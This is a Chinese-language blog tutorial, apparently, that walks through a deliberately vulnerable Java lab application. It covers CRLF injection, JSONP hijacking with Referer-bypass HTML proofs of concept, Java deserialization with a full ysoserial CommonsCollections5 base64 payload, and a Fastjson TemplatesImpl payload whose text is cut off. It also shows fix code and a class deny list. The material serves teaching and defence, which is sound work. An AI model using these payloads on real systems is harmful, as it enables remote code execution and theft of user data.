response.addHeader(&quot;test1&quot;, request.getParameter(&quot;test1&quot;));</span><br><span class="line">        response.setHeader(&quot;test2&quot;, request.getParameter(&quot;test2&quot;));</span><br><span class="line">        String author &#x3D; request.getParameter(&quot;test3&quot;);</span><br><span class="line">        Cookie cookie &#x3D; new Cookie(&quot;test3&quot;, author);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<a href="http://localhost:8080/java_sec_code_war/crlf/safecode">http://localhost:8080/java_sec_code_war/crlf/safecode</a></p><p>?test1=111%0d%0ax&amp;test2=111%0d%0a111</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909095847712.png" alt="image-20210909095847712"></p><h2 id="6-Jsonp"><a href="#6-Jsonp" class="headerlink" title="6.Jsonp"></a>6.Jsonp</h2><p>JSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。当开发者使用不当时，攻击者可以恶意利用jsonp劫持数据。</p><p>举例说明如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 jQuery 中，可以通过使用JSONP 形式的回调函数来加载其他网域的JSON数据，如 &quot;myurl?callback&#x3D;?&quot;。jQuery 将自动替换 ? 为正确的函数名，以执行回调函数。 </span><br><span class="line">jQuery 会把？注册成window.? 的系统函数，然后映射调用。</span><br><span class="line">一般用于跨域ajax请求，提供URL的一方会返回一个callback函数的JSON数据，然后回调时就能获取了。</span><br><span class="line"> </span><br><span class="line">请求的URL例子：</span><br><span class="line">&quot;myurl?callback&#x3D;123123123&quot; &#x2F;&#x2F;这个123123就是?号，jquery自动生成的。</span><br><span class="line">返回的数据例子：</span><br><span class="line">123123123(&#123;“id”:&quot;1&quot;,&quot;name&quot;:&quot;张三&quot;&#125;)</span><br></pre></td></tr></table></figure><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ControllerAdvice</span><br><span class="line">public class JSONPAdvice extends AbstractJsonpResponseBodyAdvice &#123;</span><br><span class="line"></span><br><span class="line">    public JSONPAdvice() &#123;</span><br><span class="line">        super(&quot;callback&quot;, &quot;cback&quot;); &#x2F;&#x2F; callback的参数名，可以为多个</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当有接口返回了Object(比如JSONObject或者JavaBean，但是不支持String)，只要在参数中加入<code>callback=test</code>或<code>cback=test</code>就会自动变成JSONP接口。比如下面代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;advice&quot;, produces &#x3D; MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">public JSONObject advice() &#123;</span><br><span class="line">    String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line">    return JSON.parseObject(info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然上面代码指定了response的<code>content-type</code>为<code>application/json</code>，但是在<code>AbstractJsonpResponseBodyAdvice</code>类中会设置为<code>application/javascript</code>，提供给前端调用。</p><p>设置<code>content-type</code>为<code>application/javascript</code>的代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected MediaType getContentType(MediaType contentType, ServerHttpRequest request, ServerHttpResponse response) &#123;</span><br><span class="line">return new MediaType(&quot;application&quot;, &quot;javascript&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且还会判断callback的参数只是否是有效的，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Pattern CALLBACK_PARAM_PATTERN &#x3D; Pattern.compile(&quot;[0-9A-Za-z_\\.]*&quot;);</span><br><span class="line"></span><br><span class="line">protected boolean isValidJsonpQueryParam(String value) &#123;</span><br><span class="line">return CALLBACK_PARAM_PATTERN.matcher(value).matches();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安全问题："><a href="#安全问题：" class="headerlink" title="安全问题："></a>安全问题：</h3><blockquote><p>使用<code>AbstractJsonpResponseBodyAdvice</code>能避免callback导致的XSS问题，但是会带来一个新的风险：可能有的JSON接口强行被设置为了JSONP，导致JSON劫持。所以使用<code>AbstractJsonpResponseBodyAdvice</code>，需要默认校验所有jsonp接口的referer是否合法。</p></blockquote><p>PS：</p><p>在Spring Framework 5.1，移除了<code>AbstractJsonpResponseBodyAdvice</code>类。Springboot <code>2.1.0 RELEASE</code>默认使用spring framework版本5.1.2版本。也就是在SpringBoot <code>2.1.0 RELEASE</code>及以后版本都不能使用该功能，用CORS替代。</p><p><a href="https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html">https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html</a></p><blockquote><p>Will be removed as of Spring Framework 5.1, use CORS instead.</p></blockquote><h3 id="1-前端调用代码的"><a href="#1-前端调用代码的" class="headerlink" title="1.前端调用代码的"></a>1.前端调用代码的</h3><ul><li>使用ajax的jsonp调用方式，运行后会弹框<code>JoyChou</code>。</li><li>使用script src方式，运行后会弹框<code>JoyChou</code>。</li></ul><p>使用ajax的jsonp调用方式代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;jquery&#x2F;3.4.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;jsonp&#x2F;advice&#39;,</span><br><span class="line">dataType:&#39;jsonp&#39;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">alert(data.name)</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>script src方式代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function aaa(data)&#123;</span><br><span class="line">alert(JSON.stringify(data));</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;referer?callback_&#x3D;aaa&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>script src方法 测试如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909105509839.png" alt="image-20210909105509839"></p><h3 id="2-空Referer绕过"><a href="#2-空Referer绕过" class="headerlink" title="2.空Referer绕过"></a>2.空Referer绕过</h3><p>有时候开发同学为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer，所以简单说下如何绕过空Referer。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;vuln&#x2F;emptyReferer&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String emptyReferer(HttpServletRequest request) &#123;</span><br><span class="line">    String referer &#x3D; request.getHeader(&quot;referer&quot;);</span><br><span class="line"></span><br><span class="line">    if (null !&#x3D; referer &amp;&amp; SecurityUtil.checkURL(referer) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String callback &#x3D; request.getParameter(this.callback);</span><br><span class="line">    return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加了对referer的检测我们可以使用如下方法进行绕过</p><h4 id="1-添加no-referrer-参数"><a href="#1-添加no-referrer-参数" class="headerlink" title="1.添加no-referrer 参数"></a>1.添加no-referrer 参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;      &#x2F;&#x2F;no-referrer</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function test(data)&#123;</span><br><span class="line">alert(JSON.stringify(data));</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;emptyReferer?callback_&#x3D;test&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="2-使用iframe标签进行绕过"><a href="#2-使用iframe标签进行绕过" class="headerlink" title="2.使用iframe标签进行绕过"></a>2.使用iframe标签进行绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function test(data)&#123;alert(JSON.stringify(data));&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;emptyReferer?callback_&#x3D;test&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>测试如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909111157468.png" alt="image-20210909111157468"></p><p>修复代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;sec&#x2F;checkReferer&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String safecode(HttpServletRequest request) &#123;</span><br><span class="line">    String referer &#x3D; request.getHeader(&quot;referer&quot;);</span><br><span class="line"></span><br><span class="line">    if (SecurityUtil.checkURL(referer) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String callback &#x3D; request.getParameter(this.callback);</span><br><span class="line">    return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不管referer是否为null都进行判断</p><h3 id="3-fastjsonp-to-jsonp"><a href="#3-fastjsonp-to-jsonp" class="headerlink" title="3.fastjsonp to jsonp"></a>3.fastjsonp to jsonp</h3><p>核心代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(value &#x3D; &quot;&#x2F;fastjsonp&#x2F;getToken&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String getCsrfToken2(HttpServletRequest request) &#123;</span><br><span class="line">    CsrfToken csrfToken &#x3D; cookieCsrfTokenRepository.loadToken(request); &#x2F;&#x2F; get csrf token</span><br><span class="line"></span><br><span class="line">    String callback &#x3D; request.getParameter(&quot;fastjsonpCallback&quot;);</span><br><span class="line">    if (StringUtils.isNotBlank(callback)) &#123;</span><br><span class="line">        JSONPObject jsonpObj &#x3D; new JSONPObject(callback);</span><br><span class="line">        jsonpObj.addParameter(csrfToken);</span><br><span class="line">        return jsonpObj.toString();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return csrfToken.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909143444477.png" alt="image-20210909143444477"></p><h2 id="7-Deserialize-序列化与反序列化"><a href="#7-Deserialize-序列化与反序列化" class="headerlink" title="7.Deserialize 序列化与反序列化"></a>7.Deserialize 序列化与反序列化</h2><p>​    Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">     * Add the result to rememberMe cookie.</span><br><span class="line">     * &lt;p&gt;</span><br><span class="line">     * http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;vuln</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;rememberMe&#x2F;vuln&quot;)</span><br><span class="line">    public String rememberMeVul(HttpServletRequest request)</span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">            return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">        byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line">        ObjectInputStream in &#x3D; new ObjectInputStream(bytes);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        return &quot;Are u ok?&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码相对来说也比较简单使用Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><p>利用方式如下：</p><p>使用ysoserial.jar生成payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0&#x2F;A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR&#x2F;bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo&#x2F;2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEm9wZW4gLWEgQ2FsY3VsYXRvcnQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg&#x3D;</span><br></pre></td></tr></table></figure><p>访问页面</p><p><a href="http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln">http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210926172201962.png" alt="image-20210926172201962"></p><p>修复代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;rememberMe&#x2F;security&quot;)</span><br><span class="line">public String rememberMeBlackClassCheck(HttpServletRequest request)</span><br><span class="line">        throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">        return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">    byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">    ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        AntObjectInputStream in &#x3D; new AntObjectInputStream(bytes);  &#x2F;&#x2F; throw InvalidClassException</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; catch (InvalidClassException e) &#123;</span><br><span class="line">        logger.info(e.toString());</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;I&#39;m very OK.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复方式是通过Hook resolveClass来校验反序列化的类</p><blockquote><p>序列化数据结构可以了解到包含了类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。这个方法最早是由IBM的研究人员Pierre Ernst在2013年提出《<a href="https://www.ibm.com/developerworks/library/se-lookahead/">Look-ahead Java deserialization</a>》</p></blockquote><p>跟入后对应代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 只允许反序列化SerialObject class</span><br><span class="line"> *</span><br><span class="line"> * 在应用上使用黑白名单校验方案比较局限，因为只有使用自己定义的AntObjectInputStream类，进行反序列化才能进行校验。</span><br><span class="line"> * 类似fastjson通用类的反序列化就不能校验。</span><br><span class="line"> * 但是RASP是通过HOOK java&#x2F;io&#x2F;ObjectInputStream类的resolveClass方法，全局的检测白名单。</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line">@Override</span><br><span class="line">protected Class&lt;?&gt; resolveClass(final ObjectStreamClass desc)</span><br><span class="line">        throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String className &#x3D; desc.getName();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject</span><br><span class="line">    logger.info(&quot;Deserialize class name: &quot; + className);</span><br><span class="line"></span><br><span class="line">    String[] denyClasses &#x3D; &#123;&quot;java.net.InetAddress&quot;,</span><br><span class="line">                            &quot;org.apache.commons.collections.Transformer&quot;,</span><br><span class="line">                            &quot;org.apache.commons.collections.functors&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    for (String denyClass : denyClasses) &#123;</span><br><span class="line">        if (className.startsWith(denyClass)) &#123;</span><br><span class="line">            throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, className);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return super.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果还是不太明白，可以参考：</p><ol><li><a href="https://xz.aliyun.com/t/41/">浅谈Java反序列化漏洞修复方案</a></li><li><a href="http://www.lmxspace.com/2019/11/20/Java反序列化过程深究/">Java反序列化过程深究</a></li></ol><h2 id="8-Fastjson"><a href="#8-Fastjson" class="headerlink" title="8.Fastjson"></a>8.Fastjson</h2><p>FastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。</p><p>漏洞被利用本质找到一条有效的攻击链，攻击链的末端就是有代码执行能力的类，来达到我们想做的事情，一般都是用来RCE（远程命令执行）。构造一个触发器，也就是通过什么方式来让攻击链执行你想要的代码。触发器可以通过很多方式，比如静态代码块、构造方法等等。</p><p>Fastjson反序列化漏洞被利用的原因，可以归结为两方面：</p><p>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；<br>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。<br>攻击者可以构造恶意请求，使目标应用的代码执行流程进入这部分特定setter或getter方法，若上述方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。官方采用了黑名单方式对反序列化类名校验，但随着时间的推移及自动化漏洞挖掘能力的提升。新Gadget会不断涌现，黑名单这种治标不治本的方式只会导致不断被绕过，从而对使用该组件的用户带来不断升级版本的困扰。</p><p>对编程人员而言，在使用Fastjson反序列化时会使用到Fastjson所提供的几个静态方法：</p><p>parse (String text)</p><p>parseObject(String text)</p><p>parseObject(String text, Class clazz)</p><p>无论使用上述哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法或者Setter方法，如果一个类中的Getter或者Setter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;deserialize&quot;, method &#x3D; &#123;RequestMethod.POST&#125;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String Deserialize(@RequestBody String params) &#123;</span><br><span class="line">        &#x2F;&#x2F; 如果Content-Type不设置application&#x2F;json格式，post数据会被url编码</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 将post提交的string转换为json</span><br><span class="line">            JSONObject ob &#x3D; JSON.parseObject(params);</span><br><span class="line">            return ob.get(&quot;name&quot;).toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F; Open calc in mac</span><br><span class="line">        String payload &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;: [\&quot;yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk&#x2F;OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3